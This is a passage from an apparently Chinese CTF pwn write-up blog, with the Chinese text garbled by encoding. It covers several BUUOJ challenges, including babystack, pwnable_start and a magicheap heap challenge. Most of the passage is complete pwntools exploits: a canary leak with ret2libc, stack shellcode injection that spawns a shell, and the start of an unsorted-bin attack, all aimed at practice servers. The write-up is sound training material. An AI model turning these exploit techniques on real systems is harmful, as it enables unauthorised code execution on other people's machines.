â—‚â€” 0x0</span><br><span class="line">02:0010â”‚      0x7fffffffddf8 â€”â–¸ 0x7fffffffde20 â€”â–¸ 0x7fffffffde30 â€”â–¸ 0x7fffffffdee0 â€”â–¸ 0x400a30 â—‚â€” ...</span><br><span class="line">03:0018â”‚ rsi  0x7fffffffde00 â—‚â€” 0x0</span><br><span class="line">... â†“</span><br><span class="line">07:0038â”‚      0x7fffffffde20 â€”â–¸ 0x7fffffffde30 â€”â–¸ 0x7fffffffdee0 â€”â–¸ 0x400a30 â—‚â€” 0x41ff894156415741</span><br><span class="line">08:0040â”‚      0x7fffffffde28 â—‚â€” 0x10cdd61fbdf3e300</span><br><span class="line">09:0048â”‚ rbp  0x7fffffffde30 â€”â–¸ 0x7fffffffdee0 â€”â–¸ 0x400a30 â—‚â€” 0x41ff894156415741</span><br><span class="line">0a:0050â”‚      0x7fffffffde38 â€”â–¸ 0x4009a9 â—‚â€” 0x858bffffff6c8589</span><br><span class="line">0b:0058â”‚      0x7fffffffde40 â—‚â€” 0x0</span><br><span class="line">0c:0060â”‚      0x7fffffffde48 â—‚â€” 0x200000000</span><br><span class="line">0d:0068â”‚      0x7fffffffde50 â—‚â€” 0x6161616161616161 (&#x27;aaaaaaaa&#x27;)</span><br><span class="line">... â†“</span><br><span class="line">1e:00f0â”‚      0x7fffffffded8 â—‚â€” 0x10cdd61fbdf3e300 &lt;= è¿™é‡Œå°±æ˜¯canary</span><br><span class="line">1f:00f8â”‚      0x7fffffffdee0 â€”â–¸ 0x400a30 â—‚â€” 0x41ff894156415741</span><br></pre></td></tr></table></figure><p>å¤§è‡´æ€è·¯å°±æ˜¯ï¼Œå…ˆleak canaryï¼Œç„¶åæ˜¯libcbaseï¼Œå†ä¹‹åå†™system(/bin/sh)å°±OK</p><p>expï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"><span class="comment">#io = process(&quot;./babystack&quot;)</span></span><br><span class="line"></span><br><span class="line">io = remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>,<span class="number">27068</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;./babystack&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;./libc-x64-2.23.so&quot;</span>)</span><br><span class="line"></span><br><span class="line">pop_rdi=<span class="number">0x0400a93</span></span><br><span class="line">elf=ELF(<span class="string">&#x27;./babystack&#x27;</span>)</span><br><span class="line">puts_got=elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_plt=elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">main_addr=<span class="number">0x400908</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">cmd</span>(<span class="params">choice</span>):</span></span><br><span class="line">    io.recvuntil(<span class="string">b&quot;&gt;&gt; &quot;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(choice))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">write</span>(<span class="params">content</span>):</span></span><br><span class="line">    cmd(<span class="number">1</span>)</span><br><span class="line">    io.sendline(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dump</span>():</span></span><br><span class="line">    cmd(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*(<span class="number">0x90</span>-<span class="number">0x8</span>)</span><br><span class="line">write(payload)</span><br><span class="line">dump()</span><br><span class="line">io.recvuntil(<span class="string">&#x27;a\n&#x27;</span>)</span><br><span class="line">canary = u64(io.recv(<span class="number">7</span>).rjust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line">log.success(<span class="string">&#x27;canary: &#x27;</span>+<span class="built_in">hex</span>(canary))</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*(<span class="number">0x90</span>-<span class="number">0x8</span>) +p64(canary) +<span class="string">&#x27;b&#x27;</span>*<span class="number">0x8</span> + p64(pop_rdi)</span><br><span class="line">payload +=p64(puts_got)+p64(puts_plt)+ p64(main_addr)</span><br><span class="line"></span><br><span class="line">write(payload)</span><br><span class="line">io.sendlineafter(<span class="string">&#x27;&gt;&gt;&#x27;</span>,<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">io.recv()</span><br><span class="line">puts_addr=u64(io.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line">log.success(<span class="string">&#x27;puts_addr: &#x27;</span>+<span class="built_in">hex</span>(puts_addr))</span><br><span class="line"></span><br><span class="line">base = puts_addr - libc.sym[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">sys_add = base + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">bin_sh = base + libc.search(<span class="string">&quot;/bin/sh&quot;</span>).<span class="built_in">next</span>()</span><br><span class="line"><span class="comment"># gdb.attach(io)</span></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*(<span class="number">0x90</span>-<span class="number">0x8</span>) +p64(canary) +<span class="string">&#x27;b&#x27;</span>*<span class="number">0x8</span> + p64(pop_rdi)</span><br><span class="line">payload += p64(bin_sh) +p64(sys_add)</span><br><span class="line"></span><br><span class="line">write(payload)</span><br><span class="line">io.sendlineafter(<span class="string">&quot;&gt;&gt;&quot;</span>,<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h1 id="0x36-pwnable-start"><a href="#0x36-pwnable-start" class="headerlink" title="0x36.pwnable_start"></a>0x36.pwnable_start</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">gwt@ubuntu:~/Desktop$ checksec start </span><br><span class="line">[*] <span class="string">&#x27;/home/gwt/Desktop/start&#x27;</span></span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    No RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX disabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">.text:08048060                 public _start</span><br><span class="line">.text:08048060 _start          proc near               ; DATA XREF: LOAD:08048018â†‘o</span><br><span class="line">.text:08048060                 push    esp</span><br><span class="line">.text:08048061                 push    offset _exit</span><br><span class="line">.text:08048066                 xor     eax, eax</span><br><span class="line">.text:08048068                 xor     ebx, ebx</span><br><span class="line">.text:0804806A                 xor     ecx, ecx</span><br><span class="line">.text:0804806C                 xor     edx, edx</span><br><span class="line">.text:0804806E                 push    3A465443h</span><br><span class="line">.text:08048073                 push    20656874h</span><br><span class="line">.text:08048078                 push    20747261h</span><br><span class="line">.text:0804807D                 push    74732073h</span><br><span class="line">.text:08048082                 push    2774654Ch</span><br><span class="line">.text:08048087                 mov     ecx, esp        ; addr</span><br><span class="line">.text:08048089                 mov     dl, 14h         ; len</span><br><span class="line">.text:0804808B                 mov     bl, 1           ; fd</span><br><span class="line">.text:0804808D                 mov     al, 4</span><br><span class="line">.text:0804808F                 int     80h             ; LINUX - sys_write</span><br><span class="line">.text:08048091                 xor     ebx, ebx</span><br><span class="line">.text:08048093                 mov     dl, 3Ch ; &#x27;&lt;&#x27;</span><br><span class="line">.text:08048095                 mov     al, 3</span><br><span class="line">.text:08048097                 int     80h             ; LINUX -</span><br><span class="line">.text:08048099                 add     esp, 14h</span><br><span class="line">.text:0804809C                 retn</span><br><span class="line">.text:0804809C _start          endp ; sp-analysis failed</span><br></pre></td></tr></table></figure><p>è¿›å»çš„æ ˆå¸ƒå±€æ˜¯è¿™æ ·çš„:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">00:0000â”‚ ecx esp  0xffffd134 â—‚â€” 0x2774654c (&quot;Let&#x27;&quot;)</span><br><span class="line">01:0004â”‚          0xffffd138 â—‚â€” 0x74732073 (&#x27;s st&#x27;)</span><br><span class="line">02:0008â”‚          0xffffd13c â—‚â€” 0x20747261 (&#x27;art &#x27;)</span><br><span class="line">03:000câ”‚          0xffffd140 â—‚â€” 0x20656874 (&#x27;the &#x27;)</span><br><span class="line">04:0010â”‚          0xffffd144 â—‚â€” 0x3a465443 (&#x27;CTF:&#x27;)</span><br><span class="line">05:0014â”‚          0xffffd148 â€”â–¸ 0x804809d (_exit) â—‚â€” pop    esp</span><br><span class="line">06:0018â”‚          0xffffd14c â€”â–¸ 0xffffd150 â—‚â€” 0x1</span><br><span class="line">07:001câ”‚          0xffffd150 â—‚â€” 0x1</span><br></pre></td></tr></table></figure><p>å®ƒç³»ç»Ÿè°ƒç”¨çš„æ—¶å€™ï¼Œsys_write(fd,len==0x14,addr==esp)ï¼Œè€Œespå°±æ˜¯0xffffd134è¿™é‡Œã€‚</p><p>ç¨‹åºåœ¨ä¸€å¼€å§‹çš„æ—¶å€™pushäº†_exitè¿›å»ï¼Œä¹Ÿå°±æ˜¯é€€å‡ºç¨‹åºã€‚</p><p>æ„é€ <code>payload = &#39;a&#39;*0x14+ p32(0x08048087)</code></p><p>ä¹‹åä¼šsys_readï¼Œå…¶ä¸­ebx=0,ecx=esp,edx=0x3cï¼Œä¸”æœ€åä¼šadd esp,14h.</p><p>æ„é€ ï¼š<code>payload = &#39;a&#39;*0x14+ p32(addr + 0x14) + shellcode</code></p><p>Expï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"><span class="comment"># io = process(&quot;./start&quot;)</span></span><br><span class="line">io = remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>,<span class="number">25817</span>)</span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x14</span>+ p32(<span class="number">0x08048087</span>)</span><br><span class="line">io.recv()</span><br><span class="line">io.send(payload)</span><br><span class="line">addr = u32(io.recv(<span class="number">4</span>))</span><br><span class="line">log.info(<span class="string">&#x27;addr:&#x27;</span>+<span class="built_in">hex</span>(addr))</span><br><span class="line">shellcode = <span class="string">&#x27;\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80&#x27;</span></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x14</span>+ p32(addr + <span class="number">0x14</span>)+ shellcode</span><br><span class="line"><span class="comment"># gdb.attach(io)</span></span><br><span class="line">io.send(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h1 id="0x37-mrctf2020-easyoverflow"><a href="#0x37-mrctf2020-easyoverflow" class="headerlink" title="0x37.mrctf2020_easyoverflow"></a>0x37.mrctf2020_easyoverflow</h1><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">gwt@ubuntu:~/Desktop$ checksec mrctf2020_easyoverflow </span><br><span class="line">[*] <span class="string">&#x27;/home/gwt/Desktop/mrctf2020_easyoverflow&#x27;</span></span><br><span class="line">    Arch:     amd64<span class="number">-64</span>-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> v4[<span class="number">48</span>]; <span class="comment">// [rsp+0h] [rbp-70h] BYREF</span></span><br><span class="line">  <span class="keyword">char</span> a1[<span class="number">64</span>]; <span class="comment">// [rsp+30h] [rbp-40h] BYREF</span></span><br><span class="line"></span><br><span class="line">  *&amp;a1[<span class="number">56</span>] = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">strcpy</span>(a1, <span class="string">&quot;ju3t_@_f@k3_f1@g&quot;</span>);</span><br><span class="line">  *&amp;a1[<span class="number">24</span>] = <span class="number">0LL</span>;</span><br><span class="line">  *&amp;a1[<span class="number">32</span>] = <span class="number">0LL</span>;</span><br><span class="line">  *&amp;a1[<span class="number">40</span>] = <span class="number">0LL</span>;</span><br><span class="line">  *&amp;a1[<span class="number">48</span>] = <span class="number">0</span>;</span><br><span class="line">  gets(v4, argv);</span><br><span class="line">  <span class="keyword">if</span> ( !check(a1) )</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function">__int64 __fastcall <span class="title">check</span><span class="params">(<span class="keyword">char</span> *a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line">  <span class="keyword">int</span> v3; <span class="comment">// [rsp+1Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  v3 = <span class="built_in">strlen</span>(fake_flag);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; ; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( i == v3 )</span><br><span class="line">      <span class="keyword">return</span> <span class="number">1LL</span>;</span><br><span class="line">    <span class="keyword">if</span> ( a1[i] != fake_flag[i] )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>exp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"><span class="comment"># io = process(&quot;./mrctf2020_easyoverflow&quot;)</span></span><br><span class="line">io = remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>,<span class="number">26267</span>)</span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x30</span> + <span class="string">&#x27;n0t_r3@11y_f1@g&#x27;</span></span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h1 id="0x38-wustctf2020-getshell-2"><a href="#0x38-wustctf2020-getshell-2" class="headerlink" title="0x38.wustctf2020_getshell_2"></a>0x38.wustctf2020_getshell_2</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">gwt@ubuntu:~/Desktop$ checksec wustctf2020_getshell_2 </span><br><span class="line">[*] <span class="string">&#x27;/home/gwt/Desktop/wustctf2020_getshell_2&#x27;</span></span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">ssize_t</span> <span class="title">vulnerable</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> buf[<span class="number">24</span>]; <span class="comment">// [esp+0h] [ebp-18h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> read(<span class="number">0</span>, buf, <span class="number">0x24</span>u);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">shell</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">return</span> system(<span class="string">&quot;/bbbbbbbbin_what_the_f?ck__--??/sh&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">gwt@ubuntu:~/Desktop$ ROPgadget --binary wustctf2020_getshell_2  --string <span class="string">&quot;sh&quot;</span></span><br><span class="line">Strings information</span><br><span class="line">============================================================</span><br><span class="line">0x08048670 : sh</span><br></pre></td></tr></table></figure><p>æœ‰systemï¼Œæœ‰sh.</p><p>exp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"><span class="comment"># io = process(&quot;./wustctf2020_getshell_2&quot;)</span></span><br><span class="line">io = remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>,<span class="number">28068</span>)</span><br><span class="line">io.recv()</span><br><span class="line">call_sys = <span class="number">0x08048529</span></span><br><span class="line">sh_add  = <span class="number">0x08048670</span></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*(<span class="number">0x18</span>+<span class="number">4</span>) + p32(call_sys)+p32(sh_add)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h1 id="0x39-hitcontraining-magicheap"><a href="#0x39-hitcontraining-magicheap" class="headerlink" title="0x39.hitcontraining_magicheap"></a>0x39.hitcontraining_magicheap</h1><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl __noreturn <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v3; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">char</span> buf[<span class="number">8</span>]; <span class="comment">// [rsp+0h] [rbp-10h] BYREF</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v5; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v5 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  setvbuf(_bss_start, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      menu();</span><br><span class="line">      read(<span class="number">0</span>, buf, <span class="number">8uLL</span>);</span><br><span class="line">      v3 = atoi(buf);</span><br><span class="line">      <span class="keyword">if</span> ( v3 != <span class="number">3</span> )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      delete_heap();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( v3 &gt; <span class="number">3</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( v3 == <span class="number">4</span> )</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">      <span class="keyword">if</span> ( v3 == <span class="number">4869</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( (<span class="keyword">unsigned</span> __int64)magic &lt;= <span class="number">0x1305</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="built_in">puts</span>(<span class="string">&quot;So sad !&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">          <span class="built_in">puts</span>(<span class="string">&quot;Congrt !&quot;</span>);</span><br><span class="line">          l33t();</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">LABEL_17:</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;Invalid Choice&quot;</span>);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> ( v3 == <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      create_heap();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( v3 != <span class="number">2</span> )</span><br><span class="line">        <span class="keyword">goto</span> LABEL_17;</span><br><span class="line">      edit_heap();</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>editçš„æ—¶å€™è¾“å…¥çš„é•¿åº¦ä»»æ„ï¼Œå†™fdå’Œbkä¸ºmagicçš„åœ°å€ï¼Œæ”¾å…¥unsorted binä¸­ï¼Œç„¶åå³å¯get shell</p><p>Expï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">magic = <span class="number">0x6020A0</span></span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"><span class="comment"># io = remote(&quot;node4.buuoj.cn&quot;,28141)</span></span><br><span class="line">io = process(<span class="string">&quot;./magicheap&quot;</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">CreateHeap</span>(<span class="params">size,content</span>):</span></span><br><span class="line">io.sendlineafter(<span class="string">&#x27;Your choice :&#x27;</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">io.sendlineafter(<span class="string">&#x27;Size of Heap : &#x27;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">io.sendlineafter(<span class="string">&#x27;Content of heap:&#x27;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">EditHeap</span>(<span class="params">idx,size,content</span>):</span></span><br><span class="line">io.sendlineafter(<span class="string">&#x27;Your choice :&#x27;</span>,<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">io.sendlineafter(<span class="string">&#x27;Index :&#x27;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line">io.sendlineafter(<span class="string">&#x27;Size of Heap : &#x27;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">io.sendlineafter(<span class="string">&#x27;Content of heap : &#x27;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">DeleteHeap</span>(<span class="params">idx</span>):</span></span><br><span class="line">io.sendlineafter(<span class="string">&#x27;Your choice :&#x27;</span>,<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">io.sendlineafter(<span class="string">&#x27;Index :&#x27;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">CreateHeap(<span class="number">0x10</span>,<span class="string">&quot;a&quot;</span>*<span class="number">0x10</span>)</span><br><span class="line">CreateHeap(<span class="number">0x50</span>,<span class="string">&quot;b&quot;</span>*<span class="number">0x50</span>)</span><br><span class="line">CreateHeap(<span class="number">0x10</span>,<span class="string">&quot;c&quot;</span>*<span class="number">0x10</span>)</span><br><span class="line">DeleteHeap(<span 